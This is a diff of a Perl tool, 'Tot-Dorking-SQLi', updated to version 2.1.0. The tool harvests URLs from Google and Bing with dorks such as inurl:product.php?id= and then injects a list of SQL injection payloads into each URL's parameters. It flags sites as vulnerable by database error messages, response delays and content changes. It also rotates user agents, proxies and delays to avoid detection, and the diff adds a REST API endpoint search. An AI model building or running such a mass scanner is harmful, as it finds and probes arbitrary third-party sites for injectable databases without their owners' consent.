@@ -1,11 +1,11 @@
 #!/usr/bin/perl
 
 #####################################
-# Tot-Dorking-SQLi : v2.0.0         #
+# Tot-Dorking-SQLi : v2.1.0         #
 # Autor: GagalTotal666              #
 # Enhanced SQLi Detection           #
 #####################################
-# Copyright 2017-2025 GagalTotal666 #
+# Copyright 2017-2026 GagalTotal666 #
 #####################################
 
 #########################################################################
@@ -19,7 +19,6 @@ use Term::ANSIColor;
 $| = 1;
 $SIG{'INT'} = \&Interrupt;
 
-# Modulos/Librerias
 use HTTP::Request;
 use LWP::UserAgent;
 use LWP::Protocol::https;
@@ -33,14 +32,18 @@ use URI::Escape;
 
 my ($lang, %Lang, @en, @in);
 
-$ENV{'LANG'} =~ /^(\w*)_.*$/;
-if($1 eq 'in'){
-    $lang = 'in';
-}
-elsif($1 eq 'en'){
-    $lang = 'en';
-}
-else{
+$ENV{'LANG'} = $ENV{'LANG'} || 'en_US';
+if ($ENV{'LANG'} =~ /^(\w*)_.*$/) {
+    if($1 eq 'in'){
+        $lang = 'in';
+    }
+    elsif($1 eq 'en'){
+        $lang = 'en';
+    }
+    else{
+        $lang = 'en';
+    }
+} else {
     $lang = 'en';
 }
 
@@ -121,7 +124,6 @@ else{
     'en' => \@en
 );
 
-# Enhanced User Agents list
 my @UserAgents = (
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
@@ -133,7 +135,6 @@ my @UserAgents = (
     'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36'
 );
 
-# Advanced SQLi payloads
 my @SQLiPayloads = (
     "'", 
     "''", 
@@ -154,8 +155,8 @@ my @SQLiPayloads = (
     "' OR (SELECT COUNT(*) FROM mysql.user)>0--"
 );
 
-our ($Dork,$BingDork,$List,$NumPages,$FileLinks,$Proxy,$UserAgent,$Delay);
-my @ProTime;
+our ($Dork,$BingDork,$List,$NumPages,$FileLinks,$Proxy,$UserAgent,$Delay,$Verbose,$RestAPI);
+my @ProTime :shared;
 my $ThreadCount :shared = 0;
 my $MaxThreads = 5;
 
@@ -227,6 +228,12 @@ sub GetOptions(){
             }
             $MaxThreads = $ARGV[$i];
         }
+        elsif($ARGV[$i] eq '-v' || $ARGV[$i] eq '--verbose'){
+            $Verbose = 1;
+        }
+        elsif($ARGV[$i] eq '--api' || $ARGV[$i] eq '--rest-api'){
+            $RestAPI = 1;
+        }
     }
 }
 
@@ -242,11 +249,11 @@ if($lang eq 'in'){
 \r   ██║   ╚██████╔╝   ██║       ██████╔╝╚██████╔╝██║  ██║██║  ██╗██║██║ ╚████║╚██████╔╝    ███████║╚██████╔╝███████╗██║
 \r   ╚═╝    ╚═════╝    ╚═╝       ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝
 
-\r============================================== Version V.2.0.0 ======================================================
+\r============================================== Version V.2.1.0 ======================================================
 \r=====================================  Gagaltotal666 | GhostGTR666   ================================================
 \r========================================     gagaltotal.github.io ===================================================
 
-\rgunakan: $0 [-g/b <dork>] [-p <page>] [-l <links.txt>]  [-f <pages_found>] [--proxy <proxy>] [--user-agent <ua>] [--delay <seconds>] [--threads <count>]
+\rgunakan: $0 [-g/b <dork>] [-p <page>] [-l <links.txt>] [-f <pages_found>] [--proxy <proxy>] [--user-agent <ua>] [--delay <seconds>] [--threads <count>] [--verbose] [--api]
 
   -g <Dork>
       Google Dork Pencarian
@@ -266,12 +273,14 @@ if($lang eq 'in'){
       Delay antara requests (untuk menghindari deteksi)
   --threads <count>
       Jumlah thread maksimal (default: 5)
+  --verbose
+      Aktifkan mode verbose (menampilkan detail proses)
+  --api / --rest-api
+      Aktifkan pencarian endpoint REST API
 
 Contoh Pemakaian: $0 -b inurl:product.php?id= -p 6 --delay 2
-                  $0 -g inurl:product.php?id= -p 2 --proxy http://proxy:8080
-                  $0 -g inurl:product.php?id= -p 1 -f link-vlunSQL.txt --user-agent "Mozilla/5.0"
-                  $0 -b inurl:product.php?id= -p 1 -f link-vlunSQL.txt --threads 10
-                  $0 -l links.txt -f link-vlunSQL.txt
+                  $0 -g inurl:product.php?id= -p 2 --proxy http://proxy:8080 --verbose
+                  $0 -g inurl:product.php?id= -p 1 -f link-vlunSQL.txt --api
                   $0 -l links.txt --delay 1
 
 untuk informasi contoh: perldoc $0
@@ -288,11 +297,11 @@ else{
 \r   ██║   ╚██████╔╝   ██║       ██████╔╝╚██████╔╝██║  ██║██║  ██╗██║██║ ╚████║╚██████╔╝    ███████║╚██████╔╝███████╗██║
 \r   ╚═╝    ╚═════╝    ╚═╝       ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝
                                                                                                                       
-\r============================================== Version V.2.0.0 ======================================================
+\r============================================== Version V.2.1.0 ======================================================
 \r=====================================  Gagaltotal666 | GhostGTR666   ================================================
 \r========================================     gagaltotal.github.io ===================================================
 
-\rUse: $0 [-g/b <dork>] [-p <pages>] [-l <links.txt>]  [-f <pages_found>] [--proxy <proxy>] [--user-agent <ua>] [--delay <seconds>] [--threads <count>]
+\rUse: $0 [-g/b <dork>] [-p <pages>] [-l <links.txt>] [-f <pages_found>] [--proxy <proxy>] [--user-agent <ua>] [--delay <seconds>] [--threads <count>] [--verbose] [--api]
 
   -g <Dork>
       Google Dork Search
@@ -312,12 +321,14 @@ else{
       Delay between requests (to avoid detection)
   --threads <count>
       Maximum number of threads (default: 5)
+  --verbose
+      Enable verbose mode
+  --api / --rest-api
+      Enable REST API endpoint search
 
 Example Usage: $0 -b inurl:product.php?id= -p 6 --delay 2
-               $0 -g inurl:product.php?id= -p 2 --proxy http://proxy:8080
-               $0 -g inurl:product.php?id= -p 1 -f link-vlunSQL.txt --user-agent "Mozilla/5.0"
-               $0 -b inurl:product.php?id= -p 1 -f link-vlunSQL.txt --threads 10
-               $0 -l links.txt -f link-vlunSQL.txt
+               $0 -g inurl:product.php?id= -p 2 --proxy http://proxy:8080 --verbose
+               $0 -g inurl:product.php?id= -p 1 -f link-vlunSQL.txt --api
                $0 -l links.txt --delay 1
 
 For more information: perldoc $0
@@ -325,41 +336,51 @@ EOTXT
 }
 }
 
-# INI Functions
-
 sub LinksByDork(){
     my @Links;
+    
+    $Dork ||= '';
+    $BingDork ||= '';
+    
     my $Pages = $Dork ? 0 : 1;
     my ($carga,$porcentaje) = ("",0);
 
     print "Dork: $Dork$BingDork\n";
     print "Using proxy: $Proxy\n" if $Proxy;
     print "User Agent: $UserAgent\n" if $UserAgent;
+    print color('cyan') . "Verbose mode: Enabled\n" . color('reset') if $Verbose;
+    print color('cyan') . "REST API search: Enabled\n" . color('reset') if $RestAPI;
 
-    $BingDork =~ s/ /\+/g;$Dork =~ s/ /\+/g;
-    $BingDork = uri_escape($BingDork);$Dork = uri_escape($Dork);
+    $BingDork =~ s/ /\+/g if $BingDork;
+    $Dork =~ s/ /\+/g if $Dork;
+    $BingDork = uri_escape($BingDork) if $BingDork;
+    $Dork = uri_escape($Dork) if $Dork;
 
     foreach(my $pag = 0;$pag <= $NumPages;$pag++){
         my ($HTML,$Link,@Data);
 
-        printf("\r[%-50s] %3i%%",$carga,$porcentaje < 100 ? ceil($porcentaje) : floor($porcentaje));
+        my $persen = $porcentaje < 100 ? ceil($porcentaje) : floor($porcentaje);
+        $persen = 100 if $persen > 100;
+        
+        printf("\r[%-50s] %3i%%",$carga, $persen);
         $porcentaje += (100/$NumPages);
         $carga = "=" x ($porcentaje < 100 ? ceil($porcentaje)/2 : floor($porcentaje)/2);
 
         if($Dork){
             my @Nav = &Navegar('https://www.google.com/search?q='.$Dork.'&start='.$Pages.'&num=100');
-            $HTML = $Nav[4];
-            push(@ProTime,$Nav[3]);
+            $HTML = $Nav[4] || '';
+            push(@ProTime,$Nav[3]) if defined $Nav[3];
         }
         elsif($BingDork){
             my @Nav = &Navegar('https://www.bing.com/search?q='.$BingDork.'&first='.$Pages.'&count=50');
-            $HTML = $Nav[4];
-            push(@ProTime,$Nav[3]);
+            $HTML = $Nav[4] || '';
+            push(@ProTime,$Nav[3]) if defined $Nav[3];
         }
 
         if($HTML =~ m/Our systems have detected unusual traffic from your computer/i || $HTML =~ m/recaptcha/i){
             $HTML =~ /IP address\: (\S+)\<br/i;
-            print "\r$Lang{$lang}[6] $1\n$Lang{$lang}[7] ";
+            my $ip = $1 || 'Unknown';
+            print "\r$Lang{$lang}[6] $ip\n$Lang{$lang}[7] ";
             chomp(my $CQ = <STDIN>);
 
             if($CQ =~ /^q$/i){
@@ -373,7 +394,7 @@ sub LinksByDork(){
                 $Dork = 0;
                 $Pages += 1;
                 my @Nav = &Navegar('https://www.bing.com/search?q='.$BingDork.'&first='.$Pages);
-                $HTML = $Nav[3];
+                $HTML = $Nav[4] || '';
             }
             else{
                 print "$Lang{$lang}[8]\n";
@@ -397,15 +418,25 @@ sub LinksByDork(){
         }
 
         foreach $Link(@Data){
+            my $is_api = 0;
+            if($RestAPI && ($Link =~ m/\/api\//i || $Link =~ m/\/rest\//i || $Link =~ m/\/v\d+\//i || $Link =~ m/\/json\//i)){
+                $is_api = 1;
+            }
+
             if($Link !~ m/google\./i && $Link !~ m/bing\./i && $Link !~ m/msn\./i && 
                ($Link =~ m/\%3f\S+%3d\S+/i || $Link =~ /\?\S+=\S+/ || $Link =~ /\.php\?/i || 
-                $Link =~ /\.asp\?/i || $Link =~ /\.aspx\?/i || $Link =~ /\.jsp\?/i)){
+                $Link =~ /\.asp\?/i || $Link =~ /\.aspx\?/i || $Link =~ /\.jsp\?/i || $is_api)){
                 
                 $Link =~ s/\&amp\;/\&/g;
                 $Link =~ s/%3f/?/gi;
                 $Link =~ s/%3d/=/gi;
                 $Link =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
                 $Link =~ s/^https:\/\//http:\/\//g;
+
+                if ($is_api && $Link !~ /\?/) {
+                    $Link .= "?id=1";
+                    print color('blue') . "[VERBOSE] REST API endpoint found (added test param): $Link" . color('reset') . "\n" if $Verbose;
+                }
 
                 push(@Links,$Link);
             }
@@ -463,14 +494,21 @@ sub Navegar(){
         $UA->proxy(['http', 'https'], $Proxy);
     }
 
-    $URL =~ /^https?\:\/\/([\w\.\-]+)\/*/;
-    $UA->default_header('Host' => $1) if $1;
+    my $host = '';
+    if ($URL =~ /^https?\:\/\/([\w\.\-]+)\/*/) {
+        $host = $1;
+    }
+    $UA->default_header('Host' => $host) if $host;
     $UA->default_header('Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
     $UA->default_header('Accept-Language' => 'en-US,en;q=0.5');
     $UA->default_header('Accept-Encoding' => 'gzip, deflate');
     $UA->default_header('DNT' => '1');
     $UA->default_header('Connection' => 'close');
     $UA->default_header('Upgrade-Insecure-Requests' => '1');
+
+    if ($Verbose) {
+        print color('blue') . "[VERBOSE] Requesting: $URL" . color('reset') . "\n";
+    }
 
     eval {
         local $SIG{'ALRM'} = sub { die "TimeOut" };
@@ -488,8 +526,17 @@ sub Navegar(){
 
     alarm 0;
 
-    return(0,"Time Out") if($@ && $@ =~ /TimeOut/);
-    return(0,"Fail")     unless($Resp->is_success);
+    if ($@ && $@ =~ /TimeOut/) {
+        return (0,"Time Out");
+    } elsif ($@) {
+        return (0,"Fail");
+    }
+    
+    return (0,"Fail") unless($Resp && $Resp->is_success);
+
+    if ($Verbose && $Resp) {
+        print color('blue') . "[VERBOSE] Response: " . $Resp->code . " " . $Resp->message . " | Time: $time[2]s" . color('reset') . "\n";
+    }
 
     my @Return = (1,"20x OK",0,"$time[2].0",0);
 
@@ -515,22 +562,21 @@ sub SQL(){
     return 0 unless $#Edit == 1;
 
     my @Variables = split('&',$Edit[1]);
-    my %Vars      = map {split('=',$_,2)} @Variables;
+    my %Vars      = map { my @p = split('=',$_,2); @p == 2 ? @p : ($_, '') } @Variables;
 
     foreach my $Var(keys %Vars){
         print color('cyan') . "[$Lang{$lang}[32]] $Link?$Var=..." . color('reset') . "\n";
         
-        # Test multiple SQLi payloads
         for my $payload (@SQLiPayloads) {
+            print color('magenta') . "[VERBOSE] Testing parameter '$Var' with payload: $payload" . color('reset') . "\n" if $Verbose;
             $LinkMod = &ModLink($Edit[0],\@Variables,$Var,$payload);
 
             my @Nav = &Navegar($LinkMod);
             unless($Nav[0]){ next }
             
-            $HTML[0] = $Nav[4];
-            my $response_time = $Nav[3];
+            $HTML[0] = $Nav[4] || '';
+            my $response_time = $Nav[3] || 0;
 
-            # Error-based detection
             if($HTML[0] =~ m/You have an error in your SQL syntax/i ||
                $HTML[0] =~ m/Supplied argument is not a valid MySQL/i ||
                $HTML[0] =~ m/ORA-[0-9]{5}/i ||
@@ -543,8 +589,8 @@ sub SQL(){
                 return \@Ret;
             }
 
-            # Time-based detection
-            my ($tmp,$aumento);
+            my $tmp = 0;
+            my $aumento = 0;
             $tmp += $_ foreach(@ProTime);
             $tmp = int($tmp/($#ProTime+1)) if @ProTime;
             $tmp ||= 1;
@@ -559,13 +605,11 @@ sub SQL(){
                 }
             }
 
-            # Boolean-based detection (compare with original)
             my @NavOriginal = &Navegar($Link);
             if($NavOriginal[0]) {
-                my $original_content = $NavOriginal[4];
-                my $test_content = $HTML[0];
+                my $original_content = $NavOriginal[4] || '';
+                my $test_content = $HTML[0] || '';
                 
-                # Significant SQLi
                 if($test_content ne $original_content && 
                    (length($test_content) != length($original_content) ||
                    $test_content =~ /different.*result/i)) {
@@ -592,7 +636,7 @@ sub ModLink(){
     my $Var       = $_[2];
     my $Code      = $_[3];
 
-    my %Vars = map {split('=',$_,2)} @Variables;
+    my %Vars = map { my @p = split('=',$_,2); @p == 2 ? @p : ($_, '') } @Variables;
 
     my $LinkMod = $Host.'?';
 
@@ -680,8 +724,6 @@ sub Interrupt(){
     else{print "$Lang{$lang}[19]\n";}
 }
 
-# End Functions
-
 sub main(){
     my @Links;
 
@@ -692,6 +734,8 @@ sub main(){
 
     print "$Lang{$lang}[24]\n";
     print "$Lang{$lang}[20]";
+    print color('cyan') . "Verbose mode enabled\n" . color('reset') if $Verbose;
+    print color('cyan') . "REST API endpoint search enabled\n" . color('reset') if $RestAPI;
 
     if($Dork){
         gunakan() unless $NumPages;
@@ -714,7 +758,6 @@ sub main(){
 
     print "$Lang{$lang}[22] ".($#Links+1)." links...\n" if $#Links > 0;
 
-    # Threaded scanning
     my @threads;
     foreach my $link (@Links) {
         while(1) {
@@ -756,7 +799,7 @@ Dorking-SQL
 
 =head1 Version
 
-Version v2.0.0 Enhanced
+Version v2.1.0
 
 =head1 Description
 
